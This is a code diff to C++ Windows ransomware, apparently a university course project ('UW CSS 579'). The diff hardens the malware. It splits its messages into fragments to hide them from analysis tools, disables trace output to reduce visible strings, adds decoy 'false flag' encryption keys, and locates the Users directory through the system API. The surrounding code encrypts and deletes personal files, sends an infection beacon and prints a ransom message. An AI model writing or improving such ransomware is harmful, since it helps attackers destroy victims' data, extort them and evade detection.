@@ -15,13 +15,14 @@
 #include <filesystem>
 #include <windows.h>
 #include <wincrypt.h>
+#include <Shlobj.h>
 
 namespace fs = std::experimental::filesystem;
 
 #define CLASSNAME "uwbcss579";
 #define BLOCK_LEN 128;
-#define TRACEOUTPUT // Uncomment this line to enable trace logging output
-					  // Comment out this line prior to project submission to 
+//#define TRACEOUTPUT // Uncomment define TRACEOUTPUT to enable trace logging output
+					  // Comment out define TRACEOUTPUT prior to project submission to 
 					  // minimize the strings in the program
 
 bool g_Verbosity = false;
@@ -39,27 +40,15 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount);
 void RansomMessage(DWORD dwEncryptedFileCount);
 bool AnalysisCheck();
 void PrintProgress();
+std::string wstrtostr(const std::wstring& wstr);
+
 
 int main(int argc, char* argv[])
 { 
 	std::string keyDecrypt = "";
-	std::string Banner1 = "We";
-	std::string Banner2 = "lc";
-	std::string Banner3 = "om";
-	std::string Banner4 = "e ";
-	std::string Banner5 = "to";
-	std::string Banner6 = " t";
-	std::string Banner7 = "he";
-	std::string Banner8 = " M";
-	std::string Banner9 = "at";
-	std::string Banner10 = "ri";
-	std::string Banner11 = "x!";
-	//std::string Banner12 = "!!";
-	//std::string Banner13 = " ...";
-
-	// Obfuscating this string
-	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11); // .append(Banner12).append(Banner13);
-	std::cout << BannerFinal << std::endl;
+	std::string Banner = "";
+	Banner.append("We").append("lc").append("om").append("e ").append("to").append(" t").append("he").append(" M").append("at").append("ri").append("x!");	// Obfuscating this string
+	std::cout << Banner << std::endl;
 
 	DWORD dwEncryptionResult = 0;
 	DWORD dwDecryptionResult = 0;
@@ -90,7 +79,13 @@ int main(int argc, char* argv[])
 			else
 			{ 
 				// There was no key provided with the /d option.
-				std::cout << "You must provide a password with the /d option to continue." << std::endl;
+
+				// Obfuscating the string "You must provide a password with the /d option to continue." from analysis tools
+				std::string strPasswordNeeded = "";
+				strPasswordNeeded.append("Yo").append("u ").append("mu").append("st").append(" p").append("ro").append("vi").append("de").append(" a").append(" p").append("as").append("sw").append("or").append("d ").append("wi").append("th").append(" t").append("he").append(" /").append("d ").append("op").append("ti").append("on").append(" t").append("o ").append("co").append("nt").append("in").append("ue").append(".");
+				std::cout << strPasswordNeeded << std::endl;
+
+				//std::cout << "You must provide a password with the /d option to continue." << std::endl;
 				return 0;  // Halt program exection
 			}
 		}
@@ -114,6 +109,12 @@ int main(int argc, char* argv[])
 		// Finds, Encrypts, and Deletes important personal files
 		dwEncryptionResult = FindFiles();
 
+		if (dwEncryptionResult == -25)
+		{
+			// Couldn't find the Users directory 
+			return 0; // Halt program exection
+		}
+
 		// Send network beacon to report ransom/encryption completed
 		SendInfectionBeacon(dwEncryptionResult);
 
@@ -123,16 +124,20 @@ int main(int argc, char* argv[])
 	else
 	{
 		// Finds .encrypted files, and decrypts them
-		std::cout << "You entered the password: " << keyDecrypt << std::endl;// << std::endl;
+
+		std::string strPwdMessage = "";
+		strPwdMessage.append("Yo").append("u ").append("en").append("te").append("re").append("d ").append("th").append("e ").append("pa").append("ss").append("wo").append("rd").append(": ");
+
+		std::cout << strPwdMessage << keyDecrypt << std::endl;
+		//std::cout << "You entered the password: " << keyDecrypt << std::endl;// << std::endl;
 
 		PrintProgress();
 
 		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
 		if (dwDecryptionResult > 0)
 		{
-			std::string strRecoveryFailed = "";
-
 			// Obfuscating the string "] files failed to recover.  Rerun the program with your password." from analysis tools
+			std::string strRecoveryFailed = "";
 			strRecoveryFailed.append("] ").append("fi").append("le").append("s ").append("fa").append("il").append("ed").append(" t").append("o ").append("re").append("co").append("ve").append("r.").append(" R").append("er").append("un").append(" t").append("he").append(" p").append("ro").append("gr").append("am").append(" w").append("it").append("h ").append("yo").append("ur").append(" p").append("as").append("sw").append("or").append("d.");
 			
 			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << strRecoveryFailed << std::endl;
@@ -146,17 +151,29 @@ int main(int argc, char* argv[])
 	// End with a fun message
 	if (!g_Decrypt)
 	{
-		std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
+		// Obfuscating the string "All Your Files Are Belong To Us!!! :\\" from analysis tools
+		std::string strAllYourFilesAreBelongToUs = "";
+		strAllYourFilesAreBelongToUs.append("Al").append("l ").append("Yo").append("ur").append(" F").append("il").append("es").append(" A").append("re").append(" B").append("el").append("on").append("g ").append("To").append(" U").append("s!").append("!! ").append(":\\");
+		std::cout << std::endl << strAllYourFilesAreBelongToUs << std::endl;
+		//std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
 	}
 	else
 	{
 		if (dwDecryptionResult > 0)
 		{
-			std::cout << std::endl << "Not All Your Files Are Belong To You!!! :<" << std::endl;
+			// Obfuscating the string "Not All Your Files Are Belong To You!!! :<" from analysis tools
+			std::string strNotAllYourFilesAreBelongToYou = "";
+			strNotAllYourFilesAreBelongToYou.append("No").append("t ").append("Al").append("l ").append("Yo").append("ur").append(" F").append("il").append("es").append(" A").append("re").append(" B").append("el").append("on").append("g ").append("To").append(" Y").append("ou").append("!!!").append(" :<");
+			std::cout << std::endl << strNotAllYourFilesAreBelongToYou << std::endl;
+			//std::cout << std::endl << "Not All Your Files Are Belong To You!!! :<" << std::endl;
 		}
 		else
 		{
-			std::cout << std::endl << "All Your Files Are Belong To You!!! :>" << std::endl;
+			// Obfuscating the string "All Your Files Are Belong To You!!! :>" from analysis tools
+			std::string strAllYourFilesAreBelongToYou = "";
+			strAllYourFilesAreBelongToYou.append("Al").append("l ").append("Yo").append("ur").append(" F").append("il").append("es").append(" A").append("re").append(" B").append("el").append("on").append("g ").append("To").append(" Y").append("ou").append("!!!").append(" :<");
+			std::cout << std::endl << strAllYourFilesAreBelongToYou << std::endl;
+			//std::cout << std::endl << "All Your Files Are Belong To You!!! :>" << std::endl;
 		}
 	}
 }
@@ -238,10 +255,14 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 
 	// Note: the param 'key' is not used anywhere - it is a false flag
 
-	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
+	wchar_t keyDefault0[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
 	wchar_t keyDefault1[] = L"Tm90TXlNb25rZXlzTm90TXlDaXJjdXM="; // false flag key
 	wchar_t keyDefault2[] = L"VVcgQ1NTIDU3OSBUZWFtIFByb2plY3Q="; // false flag key
-	wchar_t* keyString = keyDefault;
+	wchar_t keyDefault3[] = L"Q2xhcmlzc2FTYW1hbnRoYVNreWxhckNocmlz"; // false flag key
+	wchar_t keyDefault4[] = L"U2FtYW50aGFTa3lsYXJDaHJpc0NsYXJpc3Nh"; // false flag key
+	wchar_t keyDefault5[] = L"U2t5bGFyQ2hyaXNDbGFyaXNzYVNhbWFudGhh"; // false flag key
+
+	wchar_t* keyString = keyDefault0;
 	DWORD keyLength = lstrlenW(keyString);
 
 	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
@@ -251,7 +272,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 #ifdef TRACEOUTPUT
 	if (g_Verbosity)
 	{
-		std::wcout << "Key:         " << keyDefault << std::endl;
+		std::wcout << "Key:         " << keyDefault0 << std::endl;
 		std::cout << "Key (addr):  " << keyString << std::endl;
 		std::cout << "Key length:  " << keyLength << std::endl;
 		std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
@@ -598,7 +619,7 @@ bool EncryptAndDeleteThisFile(std::string path)
 	bool fDeleted = false;
 
 	std::string pathEncrypted = path;
-	pathEncrypted.append(".en").append("cry").append("pt").append("ed");
+	pathEncrypted.append(".en").append("cr").append("yp").append("t").append("ed");
 	//pathEncrypted.append(".encrypted");
 
 	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");
@@ -730,7 +751,37 @@ DWORD FindFiles()
 
 	
 	// Restricting search path to the Users directory
-	std::string path = "c:\\users";
+	std::string path = ""; // c:\\users
+	// Get the Users directory from the system
+	PWSTR pszUsersFolder = NULL;
+	HRESULT hr = S_OK;
+	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
+	if (!FAILED(hr))
+	{
+		// Found the Users directory, save it 
+		path = wstrtostr(pszUsersFolder);
+		CoTaskMemFree(pszUsersFolder);
+
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "Users directory:  " << path << std::endl;
+		}
+#endif
+	}
+	else
+	{
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
+		}
+#endif
+
+		return -25;
+	}
+
+
 	std::string tempExt;
 
 	for (const auto& entry : fs::recursive_directory_iterator(path))
@@ -797,10 +848,39 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 
 	// File extension filter to target encrypted files
 	// Using lowercase extenstions
-	const std::string encrypted = ".encrypted";
+	//const std::string encrypted = ".encrypted";
+	std::string encrypted = "";
+	encrypted.append(".en").append("cr").append("yp").append("t").append("ed");
 
 	// Restricting search path to the Users directory
-	std::string path = "c:\\users";
+	std::string path = ""; // c:\\users
+	// Get the Users directory from the system
+	PWSTR pszUsersFolder = NULL;
+	HRESULT hr = S_OK;
+	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
+	if (!FAILED(hr))
+	{
+		path = wstrtostr(pszUsersFolder);
+		CoTaskMemFree(pszUsersFolder);
+
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "Users directory:  " << path << std::endl;
+		}
+#endif
+	}
+	else
+	{
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
+		}
+#endif
+
+		return -25;
+	}
 
 	for (const auto& entry : fs::recursive_directory_iterator(path))
 	{
@@ -820,6 +900,10 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 			{
 				dwDecryptionCounter++;
 			}
+			else
+			{
+				std::cout << " : " << entry.path().string() << std::endl;
+			}
 		}
 	}
 
@@ -832,5 +916,18 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 #endif
 
 	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
+}
+
+std::string wstrtostr(const std::wstring& wstr)
+{
+	// Convert a PWSTR to a std::string
+
+	std::string strNewStdString;
+	char* szTmp = new char[wstr.length() + 1];
+	szTmp[wstr.size()] = '\0';
+	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, szTmp, (int)wstr.length(), NULL, NULL);
+	strNewStdString = szTmp;
+	delete[] szTmp;
+	return strNewStdString;
 }
 
